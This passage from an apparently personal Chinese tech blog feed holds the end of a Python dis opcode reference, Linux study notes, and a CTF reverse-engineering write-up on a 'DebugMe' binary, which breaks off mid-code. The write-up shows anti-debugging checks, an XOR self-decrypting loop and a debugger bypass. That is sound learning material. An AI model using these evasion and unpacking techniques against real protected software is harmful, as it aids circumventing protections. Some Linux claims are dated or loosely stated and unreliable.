内置函数了解详细信息。</p></li><li><p><code>EXTENDED_ARG</code>(<em>ext</em>)</p><p>为任意带有大到无法放入默认的单字节的参数的操作码添加前缀。 <em>ext</em> 存放一个附加字节作为参数中的高比特位。 对于每个操作码，最多允许三个 <code>EXTENDED_ARG</code> 前缀，构成两字节到三字节的参数。</p></li><li><p><code>FORMAT_VALUE</code>(<em>flags</em>)</p><p>用于实现格式化字面值字符串（f-字符串）。 从栈中弹出一个可选的 <em>fmt_spec</em>，然后是一个必须的 <em>value</em>。 <em>flags</em> 的解读方式如下：<code>(flags &amp; 0x03) == 0x00</code>: <em>value</em> 按原样格式化。<code>(flags &amp; 0x03) == 0x01</code>: 在格式化 <em>value</em> 之前调用其 <a href="https://docs.python.org/zh-cn/3.7/library/stdtypes.html#str"><code>str()</code></a>。<code>(flags &amp; 0x03) == 0x02</code>: 在格式化 <em>value</em> 之前调用其 <a href="https://docs.python.org/zh-cn/3.7/library/functions.html#repr"><code>repr()</code></a>。<code>(flags &amp; 0x03) == 0x03</code>: 在格式化 <em>value</em> 之前调用其 <a href="https://docs.python.org/zh-cn/3.7/library/functions.html#ascii"><code>ascii()</code></a>。<code>(flags &amp; 0x04) == 0x04</code>: 从栈中弹出 <em>fmt_spec</em> 并使用它，否则使用空的 <em>fmt_spec</em>。使用 <code>PyObject_Format()</code> 执行格式化。 结果会被推入栈顶。<em>3.6 新版功能.</em></p></li><li><p><code>HAVE_ARGUMENT</code></p><p>这不是一个真正的操作码。 它用于标明使用参数和不使用参数的操作码 (分别为 <code>&lt; HAVE_ARGUMENT</code> 和 <code>&gt;= HAVE_ARGUMENT</code>) 之间的分隔线。<em>在 3.6 版更改:</em> 现在每条指令都带有参数，但操作码 <code>&lt; HAVE_ARGUMENT</code> 会忽略它。 之前仅限操作码 <code>&gt;= HAVE_ARGUMENT</code> 带有参数。</p></li></ul><h2 id="操作码集合">操作码集合</h2><p>提供这些集合用于字节码指令的自动内省：</p><ul><li><p><code>dis.opname</code></p><p>操作名称序列，可使用字节码来索引。</p></li><li><p><code>dis.opmap</code></p><p>映射操作名称到字节码的字典</p></li><li><p><code>dis.cmp_op</code></p><p>所有比较操作名称的序列。</p></li><li><p><code>dis.hasconst</code></p><p>访问常量的字节码序列。</p></li><li><p><code>dis.hasfree</code></p><p>访问自由变量的字节码序列（请注意这里所说的‘自由’是指在当前作用域中被内部作用域所引用的名称，或在外部作用域中被此作用域所引用的名称。 它 <em>并不</em> 包括对全局或内置作用域的引用）。</p></li><li><p><code>dis.hasname</code></p><p>按名称访问属性的字节码序列</p></li><li><p><code>dis.hasjrel</code></p><p>具有相对跳转目标的字节码序列。</p></li><li><p><code>dis.hasjabs</code></p><p>具有绝对跳转目标的字节码序列。</p></li><li><p><code>dis.haslocal</code></p><p>访问局部变量的字节码序列。</p></li><li><p><code>dis.hascompare</code></p><p>布尔运算的字节码序列</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 学习的一些总结</title>
    <link href="/2022/05/15/Linux%E6%B7%B7%E5%88%86%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/05/15/Linux%E6%B7%B7%E5%88%86%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="目录结构图">目录结构图</h2><p><img src="https://s2.loli.net/2022/05/15/lCkAJLeE163hKDO.png" alt="Linux目录图.png"></p><h2 id="预先定义变量">预先定义变量</h2><p><code>$#</code>：表示命令行上的参数个数</p><p><code>$?</code>：表示上一条命令执行后端返回值( 0为执行成功，非0为执行失败 )</p><p><code>$$</code>：表示当前进程进程号</p><p><code>$!</code>：表示后台命令对应的进程号</p><p><code>$-</code>：表示由当前<code>shell</code>设置的执行标志名著称的字符串</p><p><code>$*</code>：表示命令行给出的实参字符串</p><p><code>$@</code>：与<code>$*</code>类似，但是可以通过<code>for</code>将程序给的实参进行依次输出，<code>$*</code>不能单独输出每个实参，只能整块输出</p><h2 id="Shell-常用通配符">Shell 常用通配符</h2><table><thead><tr><th>字符</th><th>含义</th></tr></thead><tbody><tr><td><code>*</code></td><td>匹配 0 或多个字符</td></tr><tr><td><code>?</code></td><td>匹配任意一个字符</td></tr><tr><td><code>[list]</code></td><td>匹配 list 中的任意单一字符</td></tr><tr><td><code>[^list]</code></td><td>匹配 除 list 中的任意单一字符以外的字符</td></tr><tr><td><code>[c1-c2]</code></td><td>匹配 c1-c2 中的任意单一字符 如：[0-9][a-z]</td></tr><tr><td><code>&#123;string1,string2,...&#125;</code></td><td>匹配 string1 或 string2 (或更多)其一字符串</td></tr><tr><td><code>&#123;c1..c2&#125;</code></td><td>匹配 c1-c2 中全部字符 如{1…10}</td></tr></tbody></table><h2 id="一些概念">一些概念</h2><p><img src="https://doc.shiyanlou.com/linux_base/3-10.png" alt=""></p><p>由<code>单引号</code>括起来的字符都作为<code>普通字符</code>出现</p><p>使用<code>rm</code>指令删除文件后不可恢复</p><p><code>mv</code>可以给程序进行改名</p><p><code>Linux</code>系统的开发模型是集市模型</p><p><code>Linux</code>系统中，用户文件描述符 0 表示标准输入设备文件描述符</p><p>使用不带参数的<code>cd</code>会跳转到当前用户的主目录</p><p>用户关键信息存放于<code>/etc/shadow</code>中，存放用户账号的文件<code>passwd</code>，外部设备文件存放于<code>/dev</code></p><p>硬盘分区表示：<code>/hda1</code>——第一块硬盘的第一个分区、<code>/hdb2</code>——第二块硬盘的第二个分区</p><p>当一个目录作为一个挂载点被使用后，该目录上的文件被隐藏，待挂载设备卸载后恢复</p><p><code>ifconfig</code>可以修改网卡<code>IP</code>分配地址和子网掩码</p><p><code>Linux</code>系统进程类型：交互进程、批处理进程、守护进程</p><p>更改文件拥有者：<code>chown</code></p><p><code>Linux</code>第一个版本号：0.01</p><p><code>vim</code>编辑器共有 <code>3</code> 种模式</p><p><code>Linux</code>默认分区：<code>EXT3</code> ———— 通过<code>VFS</code>来支持多种不同的文件系统</p><p><code>Linux</code>进程信息存放于<code>/proc</code></p><p><code>Linux</code>系统通过<code>write</code>给其他用户发消息</p><p><code>Linux</code>父子进程之间通讯可以采用：通过信号量进行通讯、通过共享内存进行通讯、通过数据库进行通讯</p><p><code>Linux</code>系统内核由：内存管理器、进程管理器、设备驱动程序、虚拟文件系统<code>(VFS)</code>、和网络管理组成，系统一般由：内核、shell、文件系统和应用程序</p><p>前台启动的进程可以使用<code>Ctrl + C </code>终止</p><p>进程运行方式：独立运行、使用父进程运行</p><p><code>Linux</code>中红色文件一般是压缩文件，蓝色为文件夹，白色为普通文件</p><p><code>Linux</code>文件类型：普通文件、设备文件、符号链接文件、管道文件</p><p><code>Linux</code>每个进程都有<code>4GB</code>的虚拟空间，其中内核空间占用<code>3GB ~ 4GB</code></p><p>显示已经挂载的文件系统磁盘<code>inode</code>使用状况<code>df -i</code></p><p>一个<code>bash</code>脚本的第一行是<code>#!/bin/bash</code></p><p><code>Linux</code>基本命令存放在<code>/bin</code>目录</p><p>打印机、终端 ———— 字符设备<code>(I/O设备)</code></p><blockquote><p>字符设备（Character device）：这是一个顺序的数据流设备，对这种设备的读写是按字符进行的，而且这些字符是连续地形成一个数据流。他不具备缓冲区，所以对这种设备的读写是实时的，如终端、磁带机等。</p></blockquote><p>硬盘 ———— 块设备<code>(可以随机读写)</code></p><blockquote><p>块设备是一种具有一定结构的随机存取设备，对这种设备的读写是按块进行的，他使用缓冲区来存放暂时的数据，待条件成熟后，从缓存一次性写入设备或从设备中一次性读出放入到缓冲区，如磁盘和文件系统等</p></blockquote><p>假设有文件<code>fileA</code>的对应符号链接<code>(软链接)</code>为<code>fileB</code>，删除<code>fileA</code>后<code>fileB</code>仍然存在，但是属于无效文件</p><blockquote><p>简单记忆硬链接与软链接</p><p><strong>硬链接</strong></p><blockquote><p>硬连接的作用是允许一个文件拥有多个有效路径名，这样用户就可以建立硬连接到重要文件，以防止“误删”的功能</p></blockquote><p>类似于复制粘贴文件到了另一个地方，当所有文件被删除时文件才是真正被删除完毕</p><p><strong>软连接</strong></p><blockquote><p>在符号连接中，文件实际上是一个文本文件，其中包含的有另一文件的位置信息</p></blockquote><p>类似于快捷方式，当源文件不存在时，该软连接文件也失效了，但是仍然存在，属于无效文件</p></blockquote><p><code>NFS</code>是网络文件系统</p><p><code>Linux</code>可以与其他操作系统共存于一个机器上</p><p><code>df</code>：统计磁盘空间或者是文件系统使用情况</p><p><code>du</code>：显示文件目录大小</p><p><code>tar</code>不是压缩指令<code>(文件归档)</code></p><p>在创建文件时，<code>umask</code>设置的值为<code>XXX</code>，则对应文件的权限为<code>666 - XXX</code>，如果创建的是文件夹，那么对应的权限为<code>777 - XXX</code></p><p>运行一个脚本，用户不需要<code>write</code>权限</p><p><strong>Linux系统7个运行级别</strong></p><blockquote><p>0：关机,停机模式、1：单用户模式、2：多用户模式、3：完整的多用户文本模式、4：系统未使用，保留一般不用、5：图形化模式、6：重启模式</p><p>0： 系统停机（关机）模式，系统默认运行级别不能设置为0，否则不能正常启动，一开机就自动关机。<br>1：单用户模式，root权限，用于系统维护，禁止远程登陆，就像Windows下的安全模式登录。<br>2：多用户模式，没有NFS网络支持。<br>3：完整的多用户文本模式，有NFS，登陆后进入控制台命令行模式。<br>4：系统未使用，保留一般不用，在一些特殊情况下可以用它来做一些事情。例如在笔记本电脑的电池用尽时，可以切换到这个模式来做一些设置。<br>5：图形化模式，登陆后进入图形GUI模式或GNOME、KDE图形化界面，如X Window系统。<br>6：重启模式，默认运行级别不能设为6，否则不能正常启动，就会一直开机重启开机重启。</p></blockquote><h2 id="一些命令">一些命令</h2><p><code>shutdown</code>：<code>-h</code>——关机、<code>-r</code>——重启</p><p><code>kill all</code>：终止一个用户的所有进程</p><p><code>mkdir</code>：当父目录不存在时先创建父目录可以<code>-p</code></p><p><code>$&#123;name#pattern&#125;</code>和<code>$&#123;name##pattern&#125;</code>：</p><p>如果<code>pattern（shell模式）</code>与<code>name</code>值的开头匹配，那么把<code>name</code>值去掉匹配部分后的结果就是该表达式的值，否则<code>name</code>的值就是该表达式的值。</p><p>其中<code>$&#123;name#pattern&#125;</code>，<code>name</code>值去掉的部分是与<code>pattern</code>匹配最少的部分； <code>$&#123;name##pattern&#125;</code>，<code>name</code>值去掉的部分是与<code>pattern</code>匹配最多的部分</p><p><code>$&#123;name%pattern&#125;</code>和<code>$&#123;name%%pattern&#125;</code>：</p><p>如果<code>pattern（shell模式）</code>与<code>name</code>值的末尾匹配，那么把<code>name</code>值去掉匹配部分后的结果就是该表达式的值，否则name的值就是该表达式的值。</p><p>其中<code>$&#123;name%pattern&#125;</code>，<code>name</code>值去掉的部分是与<code>pattern</code>匹配最少的部分； <code>$&#123;name%%pattern&#125;</code>，<code>name</code>值去掉的部分是与<code>pattern</code>匹配最多的部分</p><p><code>ls -all</code>不是列出当前目录中的文件和子目录名，而是列出当前目录下所有文件的详细信息</p><p>字符界面可以使用<code>exit</code>或者是<code>Ctrl + D</code>来注销<code>Linux</code></p><p><code>vi/vim</code>中使用 <code>.</code> 重复上一次对编辑文本进行的操作</p><p><code>Linux</code>下实现热启，应修改<code>/etc/inittab</code>下的<code>ca::ctrlaltdel:/sbin/shutdown -t3 -r now</code></p><p>关闭<code>Linux</code>但不重新启动使用<code>halt</code>命令</p><p><code>top</code>命令可以实时地显示进程状态信息</p><h2 id="shell编程">shell编程</h2><p><code>read</code>是赋值给变量，变量首字母不能为数字</p><p>不换行输出<code>echo -n &quot;XXX&quot;</code></p><p><code>shell</code>有两种环境变量：局部变量和环境变量</p>]]></content>
    
    
    <categories>
      
      <category>Linux Study</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SMC 逆向分析</title>
    <link href="/2022/04/12/DebugMe/"/>
    <url>/2022/04/12/DebugMe/</url>
    
    <content type="html"><![CDATA[<h1>DebugMe</h1><p>打开程序可以看到程序就只是弹出了一段对话：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">I heard you like bugs <span class="hljs-keyword">so</span> I <span class="hljs-keyword">put</span> bugs in your debugger <span class="hljs-keyword">so</span> you can have bugs <span class="hljs-keyword">while</span> you debug!!!<br>Seriously though <span class="hljs-keyword">try</span> <span class="hljs-built_in">and</span> <span class="hljs-keyword">find</span> the flag, you will <span class="hljs-keyword">find</span> it in your debugger!!!<br></code></pre></td></tr></table></figure><p>大致判断出是一个自解密，在调试过程中可以直接得到</p><p>字符串里看到有对应的字符串，但是没有交叉引用，同时也有对指针的加密解密过程，因此推断可能是一个<code>SMC</code>，对应的区段已经被加密过，在调试过程中进行还原。</p><p>拖入<code>010</code>查看节区数发现有14个节区，感觉有点不对劲，进行了一下简单调试发现似乎有反调试，直接程序无法开跑。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">mainCRTStartup_0</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> (__cdecl *v4)(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **); <span class="hljs-comment">// eax</span><br><br>  LOBYTE(v0) = NtCurrentPeb()-&gt;BeingDebugged;   <span class="hljs-comment">// 反调试？</span><br>  <span class="hljs-keyword">if</span> ( !(_BYTE)v0 )<br>  &#123;<br>    LOBYTE(v0) = NtCurrentPeb()-&gt;NtGlobalFlag;<br>    <span class="hljs-keyword">if</span> ( !(_BYTE)v0 )<br>    &#123;<br>      v1 = __rdtsc();<br>      v2 = v1;<br>      v3 = __rdtsc();<br>      v0 = v3 - v2;<br>      <span class="hljs-keyword">if</span> ( v0 &lt;= <span class="hljs-number">1000</span> )<br>      &#123;<br>        v4 = main;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          *(_BYTE *)v4 ^= <span class="hljs-number">0x5C</span>u;<span class="hljs-comment">//因该是加密部分，同时也是解密</span><br>          v4 = (<span class="hljs-keyword">int</span> (__cdecl *)(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **))((<span class="hljs-keyword">char</span> *)v4 + <span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">int</span>)v4 &lt;= (<span class="hljs-keyword">int</span>)sub_401791 );<br>        mingw_app_type = <span class="hljs-number">0</span>;<br>        __security_init_cookie();<br>        LOBYTE(v0) = __tmainCRTStartup();<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面看到大致加密因该是采用了异或的方式进行的处理，讲字节码进行异或<code>0x5C (92)</code></p><p>接下来就是找到对应加密的节区，节区长度，对其进行解密，可能要写<code>idc</code>脚本？(不会写😢)于是只能找到后到<code>010</code>进行手动修复。</p><blockquote><p>后面发现可以自己解密，如果想要保持解密后的状态就要自己写解密脚本或者<code>010</code>手动修复了</p></blockquote><p>通过不断的打断点判断哪里之前会遇到反调试，最终程序停在了这个函数处<code>mainCRTStartup_0</code>，也就是上面代码块的内容，其会对<code>v0</code>进行判断，看其是否为假，如果为真则证明触发反调试，其值被设置为了<code>1</code>，也就是常见的反调试判断<code>eax</code>是否为<code>0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">; 10:   if ( !(_BYTE)v0 )<br>.text:0040890D mov     dl, al<br>.text:0040890F cmp     al, 0                 ; al为1触发反调试<br>.text:00408911 jnz     short loc_408992      ; 退出解密<br>.text:00408911<br>.text:00408913 jmp     $+5<br>.text:00408913<br>.text:00408918 ; ---------------------------------------------------------------------------<br>.text:00408918 ; 12:     LOBYTE(v0) = NtCurrentPeb()-&gt;NtGlobalFlag;<br>.text:00408918<br>.text:00408918 loc_408918:                   ; CODE XREF: _mainCRTStartup_0+F↑j<br>.text:00408918 xor     eax, eax<br>.text:0040891A xor     edx, edx<br>.text:0040891C mov     eax, large fs:30h<br>.text:00408922 mov     al, [eax+68h]<br>.text:00408925 ; 13:     if ( !(_BYTE)v0 )<br>.text:00408925 mov     dl, al<br>.text:00408927 cmp     al, 0<br>.text:00408929 jnz     short loc_408992      ; 退出解密<br></code></pre></td></tr></table></figure><p>我们通过<code>set ip</code>进行绕过这个判断状态，进入到<code>if</code>函数内部，内部中仍然有一个<code>if ( !(_BYTE)v0 )</code>判断是否处于调试状态，仍然通过<code>set ip</code>进行绕过，进行解密完毕后就进入了如下函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __tmainCRTStartup()<br>&#123;<br>  <span class="hljs-keyword">void</span> *v0; <span class="hljs-comment">// esp</span><br>  <span class="hljs-keyword">void</span> *v1; <span class="hljs-comment">// esp</span><br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// eax</span><br>  _BYTE v4[<span class="hljs-number">84</span>]; <span class="hljs-comment">// [esp+10h] [ebp-78h] BYREF</span><br>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+64h] [ebp-24h]</span><br>  LONG *v6; <span class="hljs-comment">// [esp+68h] [ebp-20h]</span><br>  LONG Exchange; <span class="hljs-comment">// [esp+6Ch] [ebp-1Ch]</span><br>  LONG v8; <span class="hljs-comment">// [esp+70h] [ebp-18h]</span><br>  <span class="hljs-keyword">int</span> v9; <span class="hljs-comment">// [esp+74h] [ebp-14h]</span><br>  BOOL v10; <span class="hljs-comment">// [esp+78h] [ebp-10h]</span><br>  <span class="hljs-keyword">void</span> *i; <span class="hljs-comment">// [esp+7Ch] [ebp-Ch]</span><br><br>  v10 = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">memset</span>(&amp;v4[<span class="hljs-number">16</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0x44</span>u);<br>  v0 = alloca(<span class="hljs-number">48</span>);<br>  v1 = alloca(<span class="hljs-number">48</span>);<br>  i = v4;<br>  <span class="hljs-built_in">memset</span>(v4, <span class="hljs-number">204</span>, <span class="hljs-number">0x20</span>u);<br>  <span class="hljs-keyword">if</span> ( mingw_app_type )<br>    GetStartupInfoA((LPSTARTUPINFOA)&amp;v4[<span class="hljs-number">16</span>]);   <span class="hljs-comment">// 获取启动信息，来判断是否被调试</span><br>  v8 = <span class="hljs-number">0</span>;<br>  Exchange = *(_DWORD *)(NtCurrentTeb() + <span class="hljs-number">4</span>);<br>  v9 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v8 = InterlockedCompareExchange(&amp;__native_startup_lock, Exchange, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( !v8 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( v8 == Exchange )<br>    &#123;<br>      v9 = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    Sleep(<span class="hljs-number">0x3E8</span>u);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( __native_startup_state == <span class="hljs-number">1</span> )<br>  &#123;<br>    _amsg_exit(<span class="hljs-number">31</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( __native_startup_state )<br>  &#123;<br>    has_cctor = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    __native_startup_state = <span class="hljs-number">1</span>;<br>    _initterm(&amp;__crt_xc_end__, &amp;__xi_z);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( __native_startup_state == <span class="hljs-number">1</span> )<br>  &#123;<br>    _initterm(&amp;__crt_xc_start__, &amp;__xc_z);<br>    __native_startup_state = <span class="hljs-number">2</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !v9 )<br>  &#123;<br>    v6 = &amp;__native_startup_lock;<br>    v5 = <span class="hljs-number">0</span>;<br>    v5 = _InterlockedExchange(&amp;__native_startup_lock, <span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( __dyn_tls_init_callback )<br>    __dyn_tls_init_callback(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  _pei386_runtime_relocator();                  <span class="hljs-comment">// 解密</span><br>  __mingw_oldexcpt_handler = (<span class="hljs-keyword">int</span>)SetUnhandledExceptionFilter(_gnu_exception_handler);<br>  __mingw_prepare_except_for_msvcr80_and_higher();<br>  fpreset();<br>  <span class="hljs-keyword">if</span> ( mingw_app_type )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = __acmdln; *(<span class="hljs-keyword">char</span> *)i &gt; <span class="hljs-number">32</span> || *(_BYTE *)i &amp;&amp; v10; i = (<span class="hljs-keyword">char</span> *)i + <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(_BYTE *)i == <span class="hljs-number">34</span> )<br>        v10 = !v10;<br>    &#125;<br>    <span class="hljs-keyword">while</span> ( *(_BYTE *)i &amp;&amp; *(<span class="hljs-keyword">char</span> *)i &lt;= <span class="hljs-number">32</span> )<br>      i = (<span class="hljs-keyword">char</span> *)i + <span class="hljs-number">1</span>;<br>    __mingw_winmain_hInstance = <span class="hljs-number">0x400000</span>;<br>    __mingw_winmain_lpCmdLine = (<span class="hljs-keyword">int</span>)i;<br>    <span class="hljs-keyword">if</span> ( (v4[<span class="hljs-number">60</span>] &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      v2 = *(<span class="hljs-keyword">unsigned</span> __int16 *)&amp;v4[<span class="hljs-number">64</span>];<br>    <span class="hljs-keyword">else</span><br>      v2 = <span class="hljs-number">10</span>;<br>    __mingw_winmain_nShowCmd = v2;              <span class="hljs-comment">// 调用控制台</span><br>  &#125;<br>  duplicate_ppstrings(_bss_start__, &amp;argv);<br>  __main();<br>  ___initenv = envp;<br>  mainret = main(_bss_start__, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)argv, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **)envp);<span class="hljs-comment">// 启动主程序</span><br>  <span class="hljs-keyword">if</span> ( !managedapp )<br>    <span class="hljs-built_in">exit</span>(mainret);<br>  <span class="hljs-keyword">if</span> ( !has_cctor )<br>    _cexit();<br>  <span class="hljs-keyword">return</span> mainret;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时进入主函数<code>main</code>可以看到大部分数据已经被修复好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 